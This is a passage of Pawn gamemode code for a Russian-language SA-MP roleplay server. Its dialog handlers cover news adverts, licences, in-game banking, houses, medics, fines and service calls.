			case F_UNITEDNEWS: full = 0;
			}
			if(sscanf(inputtext, "s[60]",text))
			{
				format(string, 128, "Текст: %s - Прислал: %s",AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aText],AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aName]);
				return ShowPlayerDialog(playerid, D_NMENU+8, 1, "Объявления", string, "Принять", "Назад");
			}
			strmid(AdvertInfo[GetPVarInt(playerid, "AdvertID")][full][aText],text,0,strlen(text),sizeof(text));
			SendClientMessage(playerid, COLOR_LIGHTGREEN, "Объявление отредактировано и сохранено");
			ShowPlayerDialog(playerid, D_NMENU+6, 2, "Объявления", "Прочитать объявление\nРедактировать объявление\nУдалить объявление\nОтправить объявление\nОтправить администрации", "Принять", "Назад");
		}
	case D_NMENU+9:
		{
			if(!response) return true;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_NMENU+9, 1, "Панель", "Введите цену за 1 секунду в эфире:", "Принять", "Отмена");
			if(price < 1 || price > 50) return ShowPlayerDialog(playerid, D_NMENU+9, 1, "Панель", "Введите цену за 1 секунду в эфире:", "Принять", "Отмена");
			CallPrice[PlayerInfo[playerid][pNews]-1] = price;
			SendMes(playerid, COLOR_LIGHTGREEN, "Цена за 1 секунду в эфире: %i долларов", price);
			format(NewsPrice, sizeof(NewsPrice),"%i, %i, %i, %i, %i, %i", SmsPrice[0], SmsPrice[1], CallPrice[0], CallPrice[1], AdvertPrice[0], AdvertPrice[1]);
			SetOtherStr("newsprice", NewsPrice);
		}
	case D_NMENU+10:
		{
			if(!response) return true;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_NMENU+10, 1, "Панель", "Введите цену за СМС:", "Принять", "Отмена");
			if(price < 1 || price > 100) return ShowPlayerDialog(playerid, D_NMENU+10, 1, "Панель", "Введите цену за СМС:", "Принять", "Отмена");
			AdvertPrice[PlayerInfo[playerid][pNews]-1] = price;
			SendMes(playerid, COLOR_LIGHTGREEN, "Цена за СМС: %i долларов", price);
			format(NewsPrice, sizeof(NewsPrice),"%i, %i, %i, %i, %i, %i", SmsPrice[0], SmsPrice[1], CallPrice[0], CallPrice[1], AdvertPrice[0], AdvertPrice[1]);
			SetOtherStr("newsprice", NewsPrice);
		}
	case D_NMENU+11:
		{
			if(!response) return true;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_NMENU+11, 1, "Панель", "Введите цену за 1 символ объявления:", "Принять", "Отмена");
			if(price < 1 || price > 50) return ShowPlayerDialog(playerid, D_NMENU+11, 1, "Панель", "Введите цену за 1 символ объявления:", "Принять", "Отмена");
			AdvertPrice[PlayerInfo[playerid][pNews]-1] = price;
			SendMes(playerid, COLOR_LIGHTGREEN, "Цена за 1 символ объявления: %i долларов", price);
			format(NewsPrice, sizeof(NewsPrice),"%i, %i, %i, %i, %i, %i", SmsPrice[0], SmsPrice[1], CallPrice[0], CallPrice[1], AdvertPrice[0], AdvertPrice[1]);
			SetOtherStr("newsprice", NewsPrice);
		}
	case D_NMENU+12: NewsPanel(playerid);
	case D_NMENU+15:
		{
			if(!response) return true;
			new color[2], model, frac, status, Float:x, Float:y, Float:z, Float:angle;
			if(sscanf(inputtext,"p<,>iiiii",model, color[0], color[1], frac, status)) return ShowPlayerDialog(playerid, D_NMENU+15,1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			if(model < 400 || model > 611) return ShowPlayerDialog(playerid, D_NMENU+15, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			if(color[0] < 0 || color[0] > 252) return ShowPlayerDialog(playerid, D_NMENU+15, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			if(color[1] < 0 || color[1] > 252) return ShowPlayerDialog(playerid, D_NMENU+15, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			if(frac < 1 || frac > TOTALFRAC) return ShowPlayerDialog(playerid, D_NMENU+15, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			GetPlayerFacingAngle(playerid,angle);
			GetPlayerPos(playerid, x, y, z);
			new carid = CreateVehicle(model, x, y, z, angle, color[0], color[1], 90000);
			PutPlayerInVehicle(playerid, carid, 0);
			LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
			SetPVarInt(playerid, "AddVehicleFrac", carid);
			format(coordv, sizeof(coordv), "%i, %i, %i, %i, %i, %i, %i", model, color[0], color[1], frac,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),status);
			SendClientMessage(playerid, COLOR_LIGHTRED, "Тест транспорт создан. Установить координаты: /vpc");
		}
	case D_LIC:
		{
			if(!response) return DeletePVar(playerid, "LicName");
			new text[32];
			switch(listitem)
			{
			case 0: text = "водительские права";
			case 1: text = "лицензию на судоходство";
			case 2: text = "лицензию на полеты";
			case 3: text = "лицензию на рыболовство";
			case 4: text = "лицензию на оружие";
			case 5: text = "лицензию на бизнес";
			}
			if(listitem == 5 && GetPlayerBizz(GetPVarInt(playerid, "LicName")) == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не имеет бизнеса!");
			SendMes(playerid, COLOR_LIGHTBLUE, "Вы выдали %s %s", text, sendername(GetPVarInt(playerid, "LicName")));
			SendMes(GetPVarInt(playerid, "LicName"), COLOR_LIGHTBLUE, "%s %s выдал вам %s", FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername], text);
			if(listitem == 5)
			{
				new i = GetPVarInt(GetPVarInt(playerid, "LicName"), "PlayerBizz");
				BizzInfo[i][bLic] = 1;
				SetBizzInt(i, "lic", BizzInfo[i][bLic]);
			}
			else PlayerInfo[GetPVarInt(playerid, "LicName")][pLic][listitem] = 1;
			DeletePVar(playerid, "LicName");
		}
	case D_LIC+1:
		{
			if(!response) return DeletePVar(playerid, "LicName");
			if(IsPlayerInRangeOfPlayer(15.0, playerid, GetPVarInt(playerid, "LicName")))
			{
				new text[32];
				switch(listitem)
				{
				case 0: text = "водительские права";
				case 1: text = "лицензию на судоходство";
				case 2: text = "лицензию на полеты";
				case 3: text = "лицензию на рыболовство";
				case 4: text = "лицензию на оружие";
				case 5: text = "материалы";
				case 6: text = "наркотики";
				}
				SendMes(playerid, COLOR_LIGHTBLUE, "Вы забрали %s у %s", text, sendername(GetPVarInt(playerid, "LicName")));
				SendMes(GetPVarInt(playerid, "LicName"), COLOR_LIGHTBLUE, "%s %s забрал у вас %s", FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername], text);
				if(listitem >= 0 && listitem < 5)
				{
					PlayerInfo[GetPVarInt(playerid, "LicName")][pLic][listitem] = 0;
					if(IsPlayerInAnyVehicle(GetPVarInt(playerid, "LicName")) && listitem < 3) RemoveFromVehicle(GetPVarInt(playerid, "LicName"));
				}
				else
				{
					if(listitem == 5) PlayerInfo[GetPVarInt(playerid, "LicName")][pMats] = 0;
					if(listitem == 6) PlayerInfo[GetPVarInt(playerid, "LicName")][pDrugs] = 0;
				}
			}
			else SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
			DeletePVar(playerid, "LicName");
		}
	case D_LIC+2:
		{
			if(!response) return DeletePVar(playerid, "LicName");
			new text[32];
			switch(listitem)
			{
			case 0: text = "водительские права";
			case 1: text = "лицензию на судоходство";
			case 2: text = "лицензию на полеты";
			case 3: text = "лицензию на рыболовство";
			case 4: text = "лицензию на оружие";
			case 5: text = "лицензию на бизнес";
			}
			if(listitem == 5 && GetPlayerBizz(GetPVarInt(playerid, "LicName")) == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не имеет бизнеса!");
			SendMes(playerid, COLOR_LIGHTBLUE, "Вы выдали %s %s", text, sendername(GetPVarInt(playerid, "LicName")));
			SendMes(GetPVarInt(playerid, "LicName"), COLOR_LIGHTBLUE, "Администратор %s выдал вам %s",PlayerInfo[playerid][pSendername], text);
			if(listitem == 5)
			{
				new i = GetPVarInt(GetPVarInt(playerid, "LicName"), "PlayerBizz");
				BizzInfo[i][bLic] = 1;
				SetBizzInt(i, "lic", BizzInfo[i][bLic]);
			}
			else PlayerInfo[GetPVarInt(playerid, "LicName")][pLic][listitem] = 1;
			DeletePVar(playerid, "LicName");
		}
	case D_LIC+3:
		{
			if(!response) return DeletePVar(playerid, "LicName");
			new text[32];
			switch(listitem)
			{
			case 0: text = "водительские права";
			case 1: text = "лицензию на судоходство";
			case 2: text = "лицензию на полеты";
			case 3: text = "лицензию на рыболовство";
			case 4: text = "лицензию на оружие";
			case 5: text = "материалы";
			case 6: text = "наркотики";
			}

			SendMes(playerid, COLOR_LIGHTBLUE, "Вы забрали %s у %s", text, sendername(GetPVarInt(playerid, "LicName")));
			SendMes(GetPVarInt(playerid, "LicName"), COLOR_LIGHTBLUE, "Администратор %s забрал у вас %s",PlayerInfo[playerid][pSendername], text);
			if(listitem >= 0 && listitem < 5)
			{
				PlayerInfo[GetPVarInt(playerid, "LicName")][pLic][listitem] = 0;
				if(IsPlayerInAnyVehicle(GetPVarInt(playerid, "LicName")) && listitem < 3) RemoveFromVehicle(GetPVarInt(playerid, "LicName"));
			}
			else
			{
				if(listitem == 5) PlayerInfo[GetPVarInt(playerid, "LicName")][pMats] = 0;
				if(listitem == 6) PlayerInfo[GetPVarInt(playerid, "LicName")][pDrugs] = 0;
			}
		}
	case D_LIC+4:
		{
			if(!response) return BankList(playerid);
			new playerd, price;
			if(sscanf(inputtext, "ui",playerd, price)) return ShowPlayerDialog(playerid, D_LIC+4, 1, "Перевод", "Введите ID или имя игрока и кол-во долларов через запятую\n\nПример: Calvin_Klein, 15761", "Принять", "Назад");
			if(!IsPlayerConnected(playerd)) { ShowPlayerDialog(playerid, D_LIC+4, 1, "Перевод", "Введите ID или имя игрока и кол-во долларов через запятую\n\nПример: Calvin_Klein, 15761", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE); }
			if(PlayerLogged[playerd] == 0) { ShowPlayerDialog(playerid, D_LIC+4, 1, "Перевод", "Введите ID или имя игрока и кол-во долларов через запятую\n\nПример: Calvin_Klein, 15761", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED); }
			if(PlayerInfo[playerid][pBank] < price) { ShowPlayerDialog(playerid, D_LIC+4, 1, "Перевод", "Введите ID или имя игрока и кол-во долларов через запятую\n\nПример: Calvin_Klein, 15761", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBank); }
			if(price < 1) return ShowPlayerDialog(playerid, D_LIC+4, 1, "Перевод", "Введите ID или имя игрока и кол-во долларов через запятую\n\nПример: Calvin_Klein, 15761", "Принять", "Назад");
			SetPVarInt(playerid, "PriceATM", 0);
			PlayerInfo[playerid][pBank] -= price;
			PlayerInfo[playerd][pBank] += price;
			SendMes(playerid, TEAM_BLUE_COLOR, "Вы перевели на счет %s: %i долларов. Остаток на счете: %i долларов", sendername(playerd), price, PlayerInfo[playerid][pBank]);
			SendMes(playerd, TEAM_BLUE_COLOR, "%s перевел на ваш счет: %i долларов. Теперь на счете: %i долларов", PlayerInfo[playerid][pSendername], price, PlayerInfo[playerd][pBank]);
			PlayAudioStreamForPlayer(playerd, ""Namesite"", 0.0,0.0,0.0, 20, 0);
			BankList(playerid);
		}
	case D_LIC+5:
		{
			if(!response) return BankList(playerid);
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_LIC+5, 1, "Пополнение", "Введите кол-во долларов:", "Принять", "Назад");
			if(price < 1) return ShowPlayerDialog(playerid, D_LIC+5, 1, "Пополнение", "Введите кол-во долларов:", "Принять", "Назад");
			if(PlayerInfo[playerid][pBank] < price) { ShowPlayerDialog(playerid, D_LIC+5, 1, "Пополнение", "Введите кол-во долларов:", "Принять", "Назад"); return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBank); }
			new i = GetPVarInt(playerid, "PlayerHouse");
			SetPVarInt(playerid, "PriceATM", 0);
			PlayerInfo[playerid][pBank] -= price;
			HouseInfo[i][hOplata] += price;
			SetHouseInt(i, "hOplata", HouseInfo[i][hOplata]);
			SendMes(playerid, TEAM_BLUE_COLOR, "Вы положили на дом.счет: %i долларов. На дом.счете: %i долларов", price, HouseInfo[i][hOplata]);
			BankList(playerid);
		}
	case D_HOME:
		{
			if(!response) return true;
			new a = GetPVarInt(playerid, "PlayerHouse");
			switch(listitem)
			{
			case 0:
				{
					if(HouseInfo[a][hLock] == 1)
					{
						HouseInfo[a][hLock] = 0;
						format(string, 16, "~g~unlock");
						PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
						GameTextForPlayer(playerid, string, 5000, 5);
						format(string, 90, "%s достал ключи и открыл дверь дома", PlayerInfo[playerid][pSendername]);
						ProxDetectorNew(playerid,20.0,COLOR_PURPLE,string);
						SetHouseInt(a, "hLock", HouseInfo[a][hLock]);
					}
					else
					{
						if(HouseInfo[a][hLock] == 1) return SendClientMessage(playerid, COLOR_GREY, "Ваш дом уже закрыт!");
						HouseInfo[a][hLock] = 1;
						format(string, 16, "~r~lock");
						PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
						GameTextForPlayer(playerid, string, 5000, 5);
						format(string, 90, "%s достал ключи и закрыл дверь дома", PlayerInfo[playerid][pSendername]);
						ProxDetectorNew(playerid,20.0,COLOR_PURPLE,string);
						SetHouseInt(a, "hLock", HouseInfo[a][hLock]);
					}
				}

			case 1: ShowPlayerDialog(playerid, 1543, DIALOG_STYLE_LIST, "Гардероб", "Полка №1\nПолка №2\nПолка №3\nОдежда Организации", "Одеть", "Нет");
			case 2: SendMes(playerid, TEAM_BLUE_COLOR, "На домашнем счете: %i долларов", HouseInfo[a][hOplata]);
			case 3: SendMes(playerid, TEAM_BLUE_COLOR, "В вашем доме %i аптечек", HouseInfo[a][hHeal]);
			case 4: ShowPlayerDialog(playerid, D_SELLHOUSE, 0, "Продать дом", "Вы хотите продать свой дом?", "Да", "Нет");
			case 5:
				{
					new full=0;
					if(PlayerLogged[playerid] == 0) return true;
					if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете домом!");
					if(GetMoney(playerid) < MONEY_FOR_FIXCAR) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoney);
					for(new i; i < MAX_PLAYERS; i++)
					{
						if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
						if(IsPlayerInVehicle(i, GetPVarInt(playerid, "PlayerCar"))) full++; break;
					}
					if(full != 0) return SendClientMessage(playerid, COLOR_GREY, "В транспорте находятся более 1 игрока!");
					PlayerInfo[playerid][cFuel] = Fuel[GetPVarInt(playerid, "PlayerCar")];
					DestroyVehicle(GetPVarInt(playerid, "PlayerCar"));
					SendClientMessage(playerid, COLOR_YELLOW, "Ваш транспорт доставлен к вашему дому");
					GameTextForPlayer(playerid, "Car Fixed for 750$", 3000, 1);
					GiveMoney(playerid, -MONEY_FOR_FIXCAR);
					LoadMyCar(playerid);
					return true;
				}
				
			}
		}
	case 1543:
		{
			if(!response) return cmd_hpanel(playerid,inputtext);
			switch(listitem)
			{
			case 0:
				{
					if(PlayerInfo[playerid][pSkin1] != 0)
					{
						PlayerInfo[playerid][pModel] = PlayerInfo[playerid][pSkin1];
						SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
						SendClientMessage(playerid,COLOR_YELLOW,"Вы надели одежду с 1 полки");
					}
					else SendClientMessage(playerid,COLOR_GREY,"У вас нету одежды на 1 полке");
				}
			case 1:
				{
					if(PlayerInfo[playerid][pSkin2] != 0)
					{
						PlayerInfo[playerid][pModel] = PlayerInfo[playerid][pSkin2];
						SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
						SendClientMessage(playerid,COLOR_YELLOW,"Вы надели одежду с 2 полки");
					}
					else SendClientMessage(playerid,COLOR_GREY,"У вас нету одежды на 2 полке");
				}
			case 2:
				{
					if(PlayerInfo[playerid][pSkin3] != 0)
					{
						PlayerInfo[playerid][pModel] = PlayerInfo[playerid][pSkin3];
						SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
						SendClientMessage(playerid,COLOR_YELLOW,"Вы надели одежду с 3 полки");
					}
					else SendClientMessage(playerid,COLOR_RED,"У вас нету одежды на 3 полке");
				}
			case 3:
				{
					if(PlayerInfo[playerid][pChar] != 0)
					{
						SetPlayerSkin(playerid, PlayerInfo[playerid][pChar]);
						SendClientMessage(playerid,COLOR_YELLOW,"Вы надели форму организации");
					}
					else SendClientMessage(playerid,COLOR_GREY,"Вы не состоите в организации");
				}
			}
		}
	case D_HOME+1:
		{
			new taxfraction;
			if(!response) return true;
			if(sscanf(inputtext, "i",taxfraction)) return ShowPlayerDialog(playerid, D_HOME+1, 1, "Зарплата", "Установите уровень зарплаты Зоны 51:","Принять","Отмена");
			if(taxfraction > 100 || taxfraction < 50) return SendClientMessage(playerid, COLOR_GREY, "Уровень зарплаты от 50 до 100!"),ShowPlayerDialog(playerid, D_HOME+1, 1, "Зарплата", "Установите уровень зарплаты Зоны 51:","Принять","Отмена");
			TaxFraction[6] = taxfraction;
			format(TaxFractions, 90, "%d, %d, %d, %d, %d, %d", TaxFraction[1],TaxFraction[2],TaxFraction[3], TaxFraction[4], TaxFraction[5], TaxFraction[6]);
			SendMes(playerid, COLOR_YELLOW, "Установлен уровень зарплаты Зоны 51: %d", TaxFraction[6]);
			format(string, 128, "[A] %s установил новый уровень зарплаты: %d",PlayerInfo[playerid][pSendername],TaxFraction[6]);
			SendAdminMessage(COLOR_ORANGE, string);
			format(query,sizeof(query), "UPDATE "TABLE_MAYOR" SET fraction='%s'",TaxFractions);
			mysql_query(query);
		}
	case D_HEAL:
		{
			if(!response) return true;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_HEAL, 1, "Тариф", "Введите тариф:", "Принять", "Отмена");
			if(price < 1 || price > 1000) return ShowPlayerDialog(playerid, D_HEAL, 1, "Тариф", "Введите тариф:", "Принять", "Отмена");
			PlayerHealP[playerid] = price;
			SendMes(playerid, COLOR_TOMATO, "Вы вышли на дежурство и установили тариф: %i", price);
		}
	case D_HEAL+1:
		{
			new playerd = GetPVarInt(playerid, "PlayerHeal"), price = GetPVarInt(playerid, "MoneyHeal");
			if(response)
			{
				if(GetMoney(playerid) < price)
				{
					SendMes(playerd,0x6495EDFF, "У игрока %s недостаточно средств", PlayerInfo[playerid][pSendername]);
					DeletePVar(playerid, "PlayerHeal");
					DeletePVar(playerid, "MoneyHeal");
					return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств");
				}
				if(!IsPlayerInVehicle(playerid, GetPlayerVehicleID(playerd))) return SendClientMessage(playerid, COLOR_GREY, "Ошибка! Действие невозможно!");
				GiveMoney(playerd, price);
				GiveMoney(playerid, -price);
				PlayerInfo[playerid][pHealthS] = 100;
				PlayerInfo[playerid][pHeal] = 100;
				SetHealth(playerid, 100);
				if(GetPlayerDrunkLevel(playerid) > 0) SetPlayerDrunkLevel(playerid, 0);
				SendMes(playerid, 0x6495EDFF, "%s %s вылечил вас за %i долларов", FracRank[PlayerInfo[playerd][pMember]][PlayerInfo[playerd][pRank]], sendername(playerd), price);
				SendMes(playerd, 0x6495EDFF, "Вы вылечили %s за %i долларов", PlayerInfo[playerid][pSendername], price);
			}
			else SendMes(playerd,0x6495EDFF,"%s отклонил предложение вылечиться за %i долларов",PlayerInfo[playerid][pSendername], price);
			DeletePVar(playerid, "PlayerHeal");
			DeletePVar(playerid, "MoneyHeal");
		}
	case 778:
		{
			new playerd = GetPVarInt(playerid, "PlayerHeal"), price = GetPVarInt(playerid, "MoneyHeal");
			if(response)
			{
				if(GetMoney(playerid) < price)
				{
					SendMes(playerd,0x6495EDFF, "У игрока %s недостаточно средств", sendername(playerid));
					DeletePVar(playerid, "PlayerHeal");
					DeletePVar(playerid, "MoneyHeal");
					return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств");
				}
				GiveMoney(playerd, price);
				GiveMoney(playerid, -price);
				SetHealth(playerid, 100);
				if(GetPlayerDrunkLevel(playerid) > 0) SetPlayerDrunkLevel(playerid, 0);
				SendMes(playerid, 0x6495EDFF, "%s %s вылечил вас за %i долларов", FracRank[PlayerInfo[playerd][pMember]][PlayerInfo[playerd][pRank]], sendername(playerd), price);
				SendMes(playerd, 0x6495EDFF, "Вы вылечили %s за %i долларов", sendername(playerid), price);
			}
			else SendMes(playerd,0x6495EDFF,"%s отклонил предложение вылечиться за %i долларов",sendername(playerid), price);
			DeletePVar(playerid, "PlayerHeal");
			DeletePVar(playerid, "MoneyHeal");
		}
	case D_HEAL+2:
		{
			new playerd = GetPVarInt(playerid, "TicketPlayer"), price = GetPVarInt(playerid, "TicketSumma");
			if(response)
			{
				if(GetMoney(playerid) < price)
				{
					SendMes(playerd,0x6495EDFF, "У игрока %s недостаточно средств", PlayerInfo[playerid][pSendername]);
					return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств");
				}
				GiveMoney(playerd, price);
				GiveMoney(playerid, -price);
				SendMes(playerid, 0x6495EDFF, "Вы оплатили штраф на %i долларов офицеру %s'у", price, sendername(playerd));
				SendMes(playerd, 0x6495EDFF, "%s оплатил штраф в размере %i долларов", PlayerInfo[playerid][pSendername], price);
			}
			else SendMes(playerd, 0x6495EDFF, "%s отклонил предложение отплатить штраф на %i долларов",PlayerInfo[playerid][pSendername], price);
			DeletePVar(playerid, "TicketPlayer");
			DeletePVar(playerid, "TicketSumma");
			DeletePVar(playerid, "TicketReason");
		}
	case D_HEAL+3:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					new full = 0;
					if(GetPVarInt(playerid, "CallMech") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Вы недавно вызывали механиков!");
					for(new i = 0; i <= MAX_PLAYERS; i++)
					{
						if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
						if(PlayerInfo[i][pJob] == J_MECHANIC) full++;
					}
					if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "В данный момент нет механиков на дежурстве!");
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ваш запрос послан механикам. Ждите ответа");
					MechCall = playerid;
					for(new i = 0; i<= MAX_PLAYERS; i++)
					{
						if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
						if(PlayerInfo[i][pJob] == J_MECHANIC)
						{
							SendMes(i, COLOR_ALLDEPT, "%s нуждается в механике. Он/она находится в %.1f метрах от вас", PlayerInfo[playerid][pSendername], GetDistanceBetweenPlayers(playerid, i));
							format(string, 256, "%s нуждается в механике. Он/она находится в %.1f метрах от вас\n\nВы принимаете вызов?", PlayerInfo[playerid][pSendername], GetDistanceBetweenPlayers(playerid, i));
							ShowPlayerDialog(i, D_JOB+134, 0, "Диспетчер", string, "Да", "Нет");
						}
					}
				}
			case 1:
				{
					new full = 0;
					if(GetPVarInt(playerid, "CallTaxi") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Вы недавно вызывали таксиста!");
					for(new i = 0; i <= MAX_PLAYERS; i++)
					{
						if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
						if(PlayerInfo[i][pJob] == J_TAXI) full++;
					}
					if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "В данный момент нет таксистов на дежурстве!");
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ваш запрос послан таксистам. Ждите ответа");
					TaxiCall = playerid;
					for(new i = 0; i <= MAX_PLAYERS; i++)
					{
						if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
						if(PlayerInfo[i][pJob] == J_TAXI)
						{
							SendMes(i, COLOR_ALLDEPT, "%s нуждается в таксисте. Он/она находится в %.1f метрах от вас", PlayerInfo[playerid][pSendername], GetDistanceBetweenPlayers(playerid, i));
							format(string, 256, "%s нуждается в таксисте. Он/она находится в %.1f метрах от вас\n\nВы принимаете вызов?", PlayerInfo[playerid][pSendername], GetDistanceBetweenPlayers(playerid, i));
							ShowPlayerDialog(i, D_JOB+135, 0, "Диспетчер", string, "Да", "Нет");
						}
					}
				}
			case 2:
				{
					new full = 0;
					if(GetPVarInt(playerid, "CallMedic") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Вы недавно вызывали медиков!");
					foreach(new i:Player)
					{
						if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
						if(PlayerHealP[i] > 0 && PlayerInfo[i][pMember] == F_HOSPITAL) full++;
					}
					if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "В данный момент нет медиков на дежурстве!");
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ваш запрос на медицинскую помощь послан. Ждите ответа");
					MedicCall = playerid;
					foreach(new i:Player)
					{
						if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
						if(PlayerHealP[i] > 0 && PlayerInfo[i][pMember] == F_HOSPITAL)
						{
							SendMes(i, COLOR_ALLDEPT, "%s нуждается в мед. помощи. Он/она находится в %.1f метрах от вас", PlayerInfo[playerid][pSendername], GetDistanceBetweenPlayers(playerid, i));
							format(string, 256, "%s нуждается в мед. помощи. Он/она находится в %.1f метрах от вас\n\nВы принимаете вызов?", PlayerInfo[playerid][pSendername], GetDistanceBetweenPlayers(playerid, i));
							ShowPlayerDialog(i, D_HEAL+5, 0, "Диспетчер", string, "Да", "Нет");
						}
					}

				}
			case 3:
				{
					new full = 0;
					foreach(new i:Player)
					{
						if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
						if(IsACop(i)) full++;
					}
					if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "В данный момент нет полицейских на дежурстве!");
					ShowPlayerDialog(playerid, D_HEAL+4, 1, "Полиция", "Опишите ситуацию и ваше местонахождение:", "Принять", "Отмена");
				}
			}
		}
	case D_HEAL+4:
		{
			if(!response) return true;
			new reason[64];
			if(sscanf(inputtext, "s[64]",reason)) return ShowPlayerDialog(playerid, D_HEAL+4, 1, "Полиция", "Опишите ситуацию и ваше местонахождение:", "Принять", "Отмена");
			SendClientMessage(playerid, 0x2641FEAA, "Ваш запрос был отправлен полиции");
			foreach(new i:Player)
			{
				if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
				if(IsACop(i)) SendMes(i, 0x2641FEAA, "Рация: %s. Преступление: %s", PlayerInfo[playerid][pSendername], reason);
			}
		}
	case D_HEAL+5:
		{
			if(!response) return true;
			if(PlayerInfo[playerid][pMember] != F_HOSPITAL) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
			if(MedicCallTime[playerid] > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже приняли вызов!");
			if(MedicCall == -1) return SendClientMessage(playerid, COLOR_GREY, "Никто не вызывал мед. помощь!");
			if(!IsPlayerConnected(MedicCall)) return SendClientMessage(playerid, COLOR_GREY, "Игрок не найден!");
			foreach(new i:Player)
			{
				if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
				if(PlayerHealP[i] > 0 && PlayerInfo[i][pMember] == F_HOSPITAL) SendMes(i, COLOR_ALLDEPT, "%s %s принял вызов %s'а",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername], sendername(MedicCall));
			}
			SendMes(MedicCall, COLOR_LIGHTBLUE, "%s %s принял ваш вызов", FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername]);
			SendMes(playerid, COLOR_LIGHTBLUE, "Вы приняли вызов. %s находится в %.1f метрах от вас", sendername(MedicCall), GetDistanceBetweenPlayers(playerid, MedicCall));
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(MedicCall, X, Y, Z);
			SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0, 0.0, 0.0, 5);
			SetPVarInt(MedicCall, "CallMedic", gettime() + 600);
			MedicCallTime[playerid] = 180;
			MedicCall = -1;
		}
	case D_HEAL+6:
		{
			if(!response) return true;
			new price,name[32];
			if(sscanf(inputtext,"p<,>is[32]",price,name)) return ShowPlayerDialog(playerid, D_HEAL+6, 1, "Бизнес", "ВАЖНО: Цена , Название\n\nПРИМЕР: 100000 , Idlewood Gas", "Принять", "Отмена");
			if(price < 1) return ShowPlayerDialog(playerid, D_HEAL+6, 1, "Бизнес", "ВАЖНО: Цена , Название\n\nПРИМЕР: 100000 , Idlewood Gas", "Принять", "Отмена");
			TOTALBIZZ++;
			sscanf(boordh,"p<,>ffffffiii",
			BizzInfo[TOTALBIZZ][bExitx],BizzInfo[TOTALBIZZ][bExity],BizzInfo[TOTALBIZZ][bExitz],
			BizzInfo[TOTALBIZZ][bMenux],BizzInfo[TOTALBIZZ][bMenuy],BizzInfo[TOTALBIZZ][bMenuz],
			BizzInfo[TOTALBIZZ][bInt],BizzInfo[TOTALBIZZ][bMIcon], BizzInfo[TOTALBIZZ][bType]);
			GetPlayerPos(playerid,BizzInfo[TOTALBIZZ][bEntrx],BizzInfo[TOTALBIZZ][bEntry],BizzInfo[TOTALBIZZ][bEntrz]);
